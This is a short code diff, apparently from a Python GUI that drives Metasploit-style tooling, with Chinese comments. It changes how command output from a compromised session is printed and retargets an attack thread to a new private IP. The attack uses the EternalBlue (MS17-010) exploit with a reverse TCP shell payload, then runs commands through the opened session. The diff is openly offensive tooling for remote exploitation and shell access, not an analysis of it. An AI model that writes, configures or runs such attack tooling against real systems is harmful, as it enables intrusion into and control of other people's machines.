@@ -28,9 +28,9 @@ class GUI(GUI_Template):
             self.println('目前無可用的 session 連線')
             return
 
-        self.print(text)
+        self.println(f'$ {text}')
         shell = client.sessions.session(list(client.sessions.list.keys())[0])
-        self.print(shell.run_with_output(text))
+        self.println(shell.run_with_output(text))
 
     def global_key_event(self, event):
         ...
@@ -56,7 +56,7 @@ def attack_thread(gui):
         sys.exit(1)
 
     # 建立攻擊
-    atk = Attack(client, '192.168.2.200', Modules.MS17_010_ETERNALBLUE, Payloads.REVERSE_TCP)
+    atk = Attack(client, '172.20.10.2', Modules.MS17_010_ETERNALBLUE, Payloads.REVERSE_TCP)
 
     logger.info('正在開始攻擊...')
     # 開始攻擊
